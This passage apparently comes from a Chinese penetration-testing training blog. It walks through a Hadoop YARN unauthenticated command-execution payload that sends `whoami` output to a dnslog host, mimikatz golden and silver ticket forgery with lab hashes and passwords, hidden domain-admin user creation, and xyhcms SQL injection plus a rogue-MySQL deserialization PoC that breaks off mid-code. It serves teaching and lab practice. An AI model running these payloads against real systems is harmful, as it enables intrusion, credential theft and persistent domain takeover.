src=\"nTnCM6kqSSLfQGnTa4cHR9pEoB_p5B_26u83hwkFVIA.png\" alt=\"image\"></p>\n<p><img src=\"nczGpgq9npIiPEvnnesJ2HjEvrvBAy8Phw4V6Qhiato.png\" alt=\"image\"></p>\n<p><img src=\"Jq7HJc-y5tPLB3Biuwj5OiTYsdzY_7Ts6M03CV0ttxk.png\" alt=\"image\"></p>\n<h4 id=\"Hadoop\"><a href=\"#Hadoop\" class=\"headerlink\" title=\"Hadoop\"></a>Hadoop</h4><p>介绍：</p>\n<p>Hadoop作为一个分布式计算应用程序框架，种类功能繁多，各种组件安全问题会带来很大的攻击面。Apache Hadoop YARN是Hadoop的核心组件之一，负责将资源分配在Hadoop集群中运行的各种应用程序，并调度要在不同集群节点上执行的任务。(独立出的资源管理框架，负责资源管理和调度)</p>\n<p>漏洞产生原因：</p>\n<p>负责对资源进行同一管理调度的 <code>ReasourceManager</code> 组件的UI管理界面开放在 <code>8080/8088</code> 端口，攻击者无需认证即可通过<code>REST API</code> 部署任务来执行任意命令，最终可完全控制集群中所有的机器</p>\n<p>实战：</p>\n<p>1.访问 <code>8088</code> 端口</p>\n<p><img src=\"gciv2orusznpEtCox4WxKGfQ_2_D0B4BVDzluQH9Jp0.png\" alt=\"image\"></p>\n<p>2.首先访问（<code>POST</code>请求） <code>/ws/v1/cluster/apps/new-application</code> 获取 <code>application-id：application_1661169421115_0001</code></p>\n<p><img src=\"YIJZwx3kxA-byp-XfJVZxn1LqiqLOewnw7HD4-Un9_I.png\" alt=\"image\"></p>\n<p>3.获取到 <code>application-id</code> 之后，我们访问 <code>/ws/v1/cluster/apps</code> 页面，并且构造 <code>Payload</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"string\">&quot;application-id&quot;</span>: <span class=\"string\">&quot;application_1661169421115_0001&quot;</span>, <span class=\"string\">&quot;application-name&quot;</span>: <span class=\"string\">&quot;getshell&quot;</span>, <span class=\"string\">&quot;am-container-spec&quot;</span>: &#123;<span class=\"string\">&quot;commands&quot;</span>: &#123;<span class=\"string\">&quot;command&quot;</span>: <span class=\"string\">&quot;ping -c 3 `whoami`.wwa4tv.dnslog.cn&quot;</span>&#125;&#125;, <span class=\"string\">&quot;application-type&quot;</span>: <span class=\"string\">&quot;YARN&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>修改 <code>application-id</code> 的值和你要执行的命令 <code>command</code></p>\n<p><img src=\"GzO5BzB7rlubbIrhJ8WBa0RajKzPE3t2eqh-Rl8FFiE.png\" alt=\"image\"></p>\n<h2 id=\"域渗透\"><a href=\"#域渗透\" class=\"headerlink\" title=\"域渗透\"></a>域渗透</h2><p>通过域成员主机，定位出域控制器 IP 及域管理员账号，利用域成员主机作为跳 板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管 理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿 下域控制器、渗透整个内网。</p>\n<h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>域</p>\n<p>域（Domain）是一个有安全边界的计算机集合（安全边界的意思是，在两个域中，一个域中的用户无法访问另一个域中的资源）</p>\n<p>工作组的分散管理模式不适合大型的网络环境下工作，域模式就是针对大型的网络管理需求设计的，就是共享用户账号，计算机账号和安全策略的计算机集合。域中集中存储用户账号的计算机就是域控器，域中用户账号，计算机账号和安全策略被存储在域控制器上一个名为Active Directory的数据库中</p>\n<p>域控制器</p>\n<p>域控制器（Domain Controller，DC）是域中的一台类似管理服务器的计算机，我们可以形象地将它理解为一个单位的门禁系统。域控制器负责所有连入的计算机和用户的验证工作。域内的计算机如果想互相访问，都要经过域控制器的审核</p>\n<p>活动目录</p>\n<p>活动目录（Active Directory，AD）是指域环境中提供目录服务的组件</p>\n<p>目录用于存储有关网络对象（例如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制</p>\n<p>域控制器和活动目录的区别</p>\n<p>如果网络规模较大，就要把网络中的众多对象，例如计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源）。这个拥有层次结构的数据库，就是活动目录数据库，简称AD 库</p>\n<p>要实现域环境，其实就是要安装AD。如果内网中的一台计算机上安装了AD，它就变成了DC（用于存储活动目录数据库的计算机）</p>\n<p>也就是说安装了AD的计算机就是DC</p>\n<p>域内成员划分</p>\n<p>域控制器：域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息，一个网络中可以有多台域控</p>\n<p>成员服务器：成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源</p>\n<p>客户机：域中的计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户就可以登录域</p>\n<p>独立服务器：独立服务器和域没有关系。如果服务器既不加入域，也不安装活动目录，就称其为独立服务器。独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务</p>\n<h2 id=\"金银票据\"><a href=\"#金银票据\" class=\"headerlink\" title=\"金银票据\"></a>金银票据</h2><p>域控：</p>\n<p>redteam\\administrator   ASDqwe123</p>\n<p>redteam\\test    ASDqwe321</p>\n<h3 id=\"黄金票据\"><a href=\"#黄金票据\" class=\"headerlink\" title=\"黄金票据\"></a>黄金票据</h3><p>（普通域账户，利用黄金票据，创建域管账户)</p>\n<h4 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h4><p>我们拿下域控，但是因为版本原因我们抓不到域管理的明文密码，我们需要进行横向的渗透，这时候可以使用黄金票据。</p>\n<p>另外，做权限维持方式很多，如粘滞键、注册表注入、计划任务、影子用户等等。由于本次是拿到域控，那么这种情况下，我们使用黄金票据是一种非常好的权限维持的方法。</p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</span><br><span class=\"line\"></span><br><span class=\"line\">黄金票据常用于权限维持。</span><br><span class=\"line\">当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的ntlm hash制作黄金票据伪造tgt，重新获取域控的管理权限。</span><br></pre></td></tr></table></figure>\n<h4 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h4><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">1、域名称</span><br><span class=\"line\">2、域的SID值</span><br><span class=\"line\">3、域的KRBTGT账号的HASH</span><br><span class=\"line\">4、伪造任意用户名</span><br><span class=\"line\">（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</span><br></pre></td></tr></table></figure>\n<h4 id=\"实践\"><a href=\"#实践\" class=\"headerlink\" title=\"实践\"></a>实践</h4><p>假设已经通过hash传递（pth）的方式拿到了域控。</p>\n<h5 id=\"基本信息获取（SID-所处域）\"><a href=\"#基本信息获取（SID-所处域）\" class=\"headerlink\" title=\"基本信息获取（SID,所处域）\"></a>基本信息获取（SID,所处域）</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里直接在域控制权上进行操作</span><br><span class=\"line\">whoami /user    获取域的sid值(去掉最后的-<span class=\"number\">500</span>，<span class=\"number\">500</span>表示为administrator用户)</span><br><span class=\"line\">net config workstation  查看所处域</span><br></pre></td></tr></table></figure>\n<p><img src=\"GssVmuiFpBJXx-JA43RiHs3LwuexaHdmASkJ1yfy0jk.png\" alt=\"image\"></p>\n<h5 id=\"获取krbtgt用户hash\"><a href=\"#获取krbtgt用户hash\" class=\"headerlink\" title=\"获取krbtgt用户hash\"></a>获取krbtgt用户hash</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">lsadump::lsa /patch     #获取krbtgt用户hash,域的sid</span><br><span class=\"line\">lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;privilege::debug&quot;</span> <span class=\"string\">&quot;lsadump::lsa /patch /name:krbtgt&quot;</span> <span class=\"string\">&quot;exit&quot;</span>&gt;log.txt</span><br><span class=\"line\">Domain : REDTEAM / S-<span class=\"number\">1</span>-<span class=\"number\">5</span>-<span class=\"number\">21</span>-<span class=\"number\">1369463948</span>-<span class=\"number\">4259058215</span>-<span class=\"number\">1178529480</span></span><br><span class=\"line\">RID  : 000001f6 (<span class=\"number\">502</span>)</span><br><span class=\"line\">User : krbtgt</span><br><span class=\"line\">LM   : </span><br><span class=\"line\">NTLM : c67716880c23adca2f6ae752f23e46fe</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>此时我们已经拥有krbtgt账号的hash，接下来切换到普通机器，使用mimikatz制作黄金票据。</p>\n<p>此时我们无法连接域控。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">dir \\\\ad01.redteam.club\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"Nec7p8AFrEm2HUqwypecCtJZz7mH69olyz02EC-fGfU.png\" alt=\"image\"></p>\n<h5 id=\"先清除票据\"><a href=\"#先清除票据\" class=\"headerlink\" title=\"先清除票据\"></a>先清除票据</h5><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::tgt</span><br><span class=\"line\">kerberos::purge</span><br><span class=\"line\">kerberos::tgt</span><br></pre></td></tr></table></figure>\n<p><img src=\"QiG-KeB1UWLJULUq_no5Aiy5Czoi8VahsgR-p5NwXiw.png\" alt=\"image\"></p>\n<h5 id=\"制作票据\"><a href=\"#制作票据\" class=\"headerlink\" title=\"制作票据\"></a>制作票据</h5><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::golden /user:XXX任意用户名 /domain:域名 /sid:域的sid值 /krbtgt:krbtgt的hash /ticket:XXX.kirbi(生成的票据名称)</span><br><span class=\"line\"></span><br><span class=\"line\">kerberos::golden /user:huangjin /domain:redteam.club /sid:S-1-5-21-1369463948-4259058215-1178529480 /krbtgt:c67716880c23adca2f6ae752f23e46fe /ticket:huangjin.kirbi</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"NdMFExv3RTOukg_BJbpkvOX5u7gbI-PmUuRKG49y8no.png\" alt=\"image\"></p>\n<h5 id=\"票据传递\"><a href=\"#票据传递\" class=\"headerlink\" title=\"票据传递\"></a>票据传递</h5><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::ptt huangjin.kirbi   //注入票据</span><br><span class=\"line\">dir \\\\ad01.redteam.club\\c$    //尝试访问域控的C盘，访问成功</span><br></pre></td></tr></table></figure>\n<p><img src=\"YyiPl42NA2E-G1LTG5vurvdpRpPLe_nOjMoUIhCmvjI.png\" alt=\"image\"></p>\n<p>此时一个通往域内任意服务的后门制作完成。<br>可以直接使用psexec工具获得交互权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">可以直接使用psexec工具获得交互权限</span><br><span class=\"line\">PsExec64.exe \\\\ad01.redteam.club -s cmd.exe</span><br></pre></td></tr></table></figure>\n<p><img src=\"0N2rMk5Wjxt98tyt9PUly5BCAGVQB59zSgrFbSp3YbE.png\" alt=\"image\"></p>\n<h5 id=\"创建隐藏用户\"><a href=\"#创建隐藏用户\" class=\"headerlink\" title=\"创建隐藏用户\"></a>创建隐藏用户</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">也可以在域内创建隐藏用户。(用户名要以$结尾)</span><br><span class=\"line\">net user garck$ Aa123456 /add /domain</span><br><span class=\"line\">net user /domain  <span class=\"comment\">//不能查看</span></span><br><span class=\"line\">net group <span class=\"string\">&quot;domain admins&quot;</span> /domain  <span class=\"comment\">//据说查看</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"ZFJuLLjQBMAyi5RbAs3AIKnu1MzaP0xh6Fp5Jeyn8X0.png\" alt=\"image\"></p>\n<p><img src=\"NSmmENKaOIZsUWkkFZl6XXAvXo-P9pCZU1nVjJOmJtU.png\" alt=\"image\"></p>\n<h3 id=\"白银票据\"><a href=\"#白银票据\" class=\"headerlink\" title=\"白银票据\"></a>白银票据</h3><h4 id=\"使用场景-1\"><a href=\"#使用场景-1\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h4><p>在拿到一个普通的域成员权限的时候，可以尝试使用ms14-068伪造一个票据，从而让我们的域用户有域管理员权限。</p>\n<h4 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h4><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。</span><br><span class=\"line\">在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。</span><br><span class=\"line\">所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</span><br></pre></td></tr></table></figure>\n<h4 id=\"条件-1\"><a href=\"#条件-1\" class=\"headerlink\" title=\"条件\"></a>条件</h4><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务器名</span><br><span class=\"line\">4.可利用的服务</span><br><span class=\"line\">5.服务账号的NTML HASH </span><br><span class=\"line\">6.需要伪造的用户名</span><br></pre></td></tr></table></figure>\n<h4 id=\"实践-1\"><a href=\"#实践-1\" class=\"headerlink\" title=\"实践\"></a>实践</h4><p>基本信息获取（SID（同一个域下得sid一样)，所处域，服务器名，NTLM HASH）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SID和所处域参考上面</span><br><span class=\"line\">whoami /user </span><br><span class=\"line\">net config workstation</span><br><span class=\"line\">​C:\\Users\\test\\Desktop&gt;whoami /user</span><br><span class=\"line\">用户信息</span><br><span class=\"line\">----------------</span><br><span class=\"line\">用户名       SID</span><br><span class=\"line\">============ ==============================================</span><br><span class=\"line\">redteam\\test S-<span class=\"number\">1</span>-<span class=\"number\">5</span>-<span class=\"number\">21</span>-<span class=\"number\">1369463948</span>-<span class=\"number\">4259058215</span>-<span class=\"number\">1178529480</span>-<span class=\"number\">1104</span> <span class=\"comment\">//同一个域下得sid一样</span></span><br><span class=\"line\">C:\\Users\\test\\Desktop&gt;net config workstation</span><br><span class=\"line\">计算机名                     \\\\12SERVER4</span><br><span class=\"line\">计算机全名                   12server4.redteam.club</span><br><span class=\"line\">用户名                       test</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">获取服务账号hash</span><br><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;privilege::debug&quot;</span> <span class=\"string\">&quot;sekurlsa::logonPasswords&quot;</span> <span class=\"string\">&quot;exit&quot;</span>&gt;log1.txt</span><br></pre></td></tr></table></figure>\n<p>需要注意的是，这里一定要选择服务器的名字跟他的hash</p>\n<p>注意是DC$用户的NTLM-Hash,非administrator,因为要利用共享服务账号</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">* Username : AD01$</span><br><span class=\"line\">* NTLM     : 07ee036c46e648300c969b8884065d51</span><br></pre></td></tr></table></figure>\n<p><img src=\"3FQ9HsCZIb78fTYGxzjJX5Z7KAiHHIxKDgWWUL5NPlE.png\" alt=\"image\"></p>\n<h5 id=\"清除票据\"><a href=\"#清除票据\" class=\"headerlink\" title=\"清除票据\"></a>清除票据</h5><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::tgt</span><br><span class=\"line\">kerberos::purge</span><br><span class=\"line\">kerberos::tgt</span><br><span class=\"line\">kerberos::list //查看本地保存的票据</span><br></pre></td></tr></table></figure>\n<p><img src=\"tRnolH4RSkTzeeJOi_HGHkEfLJY5VeC1uxjnQ5asNVA.png\" alt=\"image\"></p>\n<h5 id=\"制作票据-1\"><a href=\"#制作票据-1\" class=\"headerlink\" title=\"制作票据\"></a>制作票据</h5><p>伪造共享文件夹服务（cifs）权限</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class=\"line\"></span><br><span class=\"line\">伪造共享文件夹服务（cifs）权限</span><br><span class=\"line\">kerberos::golden /domain:redteam.club /sid:S-1-5-21-1369463948-4259058215-1178529480 /target:ad01.redteam.club /service:cifs /rc4:07ee036c46e648300c969b8884065d51 /user:baiyin /ptt</span><br><span class=\"line\">//验证访问</span><br><span class=\"line\">dir \\\\ad01.redteam.club\\c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"LqzBC2JF5kW1H8DXHnUrz_C514uhicVIZhW-hDSDp0E.png\" alt=\"image\"></p>\n<p><img src=\"UU8EB0bwud5Z0EfwVTk1jIMIDXGtD88t814P4mv8ETI.png\" alt=\"image\"></p>\n<p>伪造LDAP服务权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//伪造LDAP服务权限</span></span><br><span class=\"line\">kerberos::golden /domain:cyber.com /sid:S-<span class=\"number\">1</span>-<span class=\"number\">5</span>-<span class=\"number\">21</span>-<span class=\"number\">1369463948</span>-<span class=\"number\">4259058215</span>-<span class=\"number\">1178529480</span> /target:ad01.redteam.club /service:ldap /rc4:07ee036c46e648300c969b8884065d51 /user:baiyin2 /ptt</span><br><span class=\"line\"><span class=\"comment\">//获取krbtgt的hash</span></span><br><span class=\"line\">lsadump::dcsync /dc:ad01.redteam.club /domain:redteam.club /user:krbtgt   </span><br></pre></td></tr></table></figure>\n<p>伪造前没权限</p>\n<p><img src=\"5vyI64uXoW8MmKPPQahJuIMQKIpOBLz68sHlfTOXVRU.png\" alt=\"image\"></p>\n<p>伪造成功</p>\n<p><img src=\"owAKCfr7arofYhvCsiw9C1om3rk_tWON6pZyVeIuBB4.png\" alt=\"image\"></p>\n<p>伪造后</p>\n<p><img src=\"J9PGRHM2NglSDcQJ4fZYIbOvYkcHWCE7ghxUCdmNWG0.png\" alt=\"image\"></p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">金票和银票的区别</span><br><span class=\"line\">获取的权限不同</span><br><span class=\"line\">金票：伪造的TGT，可以获取任意Kerberos的访问权限</span><br><span class=\"line\">银票：伪造的ST，只能访问指定的服务，如CIFS</span><br><span class=\"line\"></span><br><span class=\"line\">认证流程不同</span><br><span class=\"line\">金票：同KDC交互，但不同AS交互</span><br><span class=\"line\">银票：不同KDC交互，直接访问Server</span><br><span class=\"line\"></span><br><span class=\"line\">加密方式不同</span><br><span class=\"line\">金票：由krbtgt NTLM Hash 加密</span><br><span class=\"line\">银票：由服务账号 NTLM Hash 加密</span><br></pre></td></tr></table></figure>\n<h2 id><a href=\"#\" class=\"headerlink\" title></a></h2>","categories":["原创培训课件"],"tags":["中间件","域渗透"]},{"title":"scaner从外网到拿下域控","url":"/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/","content":"<h1 id=\"scaner从外网到拿下域控\"><a href=\"#scaner从外网到拿下域控\" class=\"headerlink\" title=\"scaner从外网到拿下域控\"></a>scaner从外网到拿下域控</h1><h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这是个人moonsec考核的出师文章</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><h2 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h2><p>打开了站点很明显发现了这是个xyhcms，先使用御剑扫一波目录，未发现敏感信息。</p>\n<h2 id=\"漏洞整理\"><a href=\"#漏洞整理\" class=\"headerlink\" title=\"漏洞整理\"></a>漏洞整理</h2><p>从网上查找该cms的一些相关的漏洞，找到了一个前台SQL注入和一些后台getshell,以及反序列化漏洞。</p>\n<p>前台SQL注入：<a href=\"http://althims.com/2020/02/03/xyhcms-3-6/\">http://althims.com/2020/02/03/xyhcms-3-6/</a></p>\n<p>后台getshell：<a href=\"https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/\">https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>\n<p>反序列化：<a href=\"https://www.anquanke.com/post/id/232823\">https://www.anquanke.com/post/id/232823</a></p>\n<h2 id=\"在本地搭建xyhcms进行测试\"><a href=\"#在本地搭建xyhcms进行测试\" class=\"headerlink\" title=\"在本地搭建xyhcms进行测试\"></a>在本地搭建xyhcms进行测试</h2><p>搭建使用的是phpstudy集成工具</p>\n<h3 id=\"前台SQL注入\"><a href=\"#前台SQL注入\" class=\"headerlink\" title=\"前台SQL注入\"></a>前台SQL注入</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/index.php/Api/Lt/alist</span></span><br><span class=\"line\">?orderby[<span class=\"title function_ invoke__\">updatexml</span>(<span class=\"number\">1</span>,<span class=\"title function_ invoke__\">concat</span>(<span class=\"title function_ invoke__\">char</span>(<span class=\"number\">126</span>),(select <span class=\"title function_ invoke__\">database</span>()),<span class=\"title function_ invoke__\">char</span>(<span class=\"number\">126</span>)),<span class=\"number\">1</span>);]=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"eFiDj6ZnDA-I7w_D_zmx58BYFtwNVMRLVWolNtJ3uYw.png\" alt=\"image\"></p>\n<p>通过日志查看结果：成功执行user()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/App/Runtime/Logs/Api/22_05_14.log</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"2AhTENzE3OvrZY3JEuQOID-q9LWDkoRzgIrqLeBQ3go.png\" alt=\"image\"></p>\n<h3 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h3><p>查看前面看到的反序列化文章，这个反序列化漏洞，事先需要拿到key，在本地导出了SQL文件能查询到这个key，说明该key是存在于数据库中的，可以结合前面的SQL注入拿到。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select username from xyh_admin limit 0,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>\n<p>然后通过查看日志拿到key：iqQmhxkAU</p>\n<p>注册一个会员</p>\n<p><img src=\"0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png\" alt=\"image\"></p>\n<p>登录之后抓包</p>\n<p><img src=\"vqMPR-A3881I2hhT0u2Zg9yxN5SL47Q67Mfdx5-xCxM.png\" alt=\"image\"></p>\n<p>伪造nickname的值可以操作数据库</p>\n<h3 id=\"恶意MySQL服务器读取数据库文件\"><a href=\"#恶意MySQL服务器读取数据库文件\" class=\"headerlink\" title=\"恶意MySQL服务器读取数据库文件\"></a>恶意MySQL服务器读取数据库文件</h3><p>让系统报错，拿到绝对路径：</p>\n<p>xyh.com&#x2F;App&#x2F;Api&#x2F;Conf&#x2F;config.php</p>\n<p>绝对路径：</p>\n<p><strong>C:\\phpstudy_pro\\WWW\\xyh.com\\App\\Api\\Conf\\config.php</strong></p>\n<p><img src=\"KaMc7sJAAqq0hupbC3YG5-qMTqkJyWdGpjGxIFPvVVc.png\" alt=\"image\"></p>\n<p>数据库配置文件的默认路径：xyhcms\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>构建的地址为：C:\\\\phpstudy_pro\\\\WWW\\\\xyh.com\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>启动MySQL服务：</p>\n<p><code>python rogue_mysql_server.py</code></p>\n<p>设置POC：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=192.168.8.133;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title 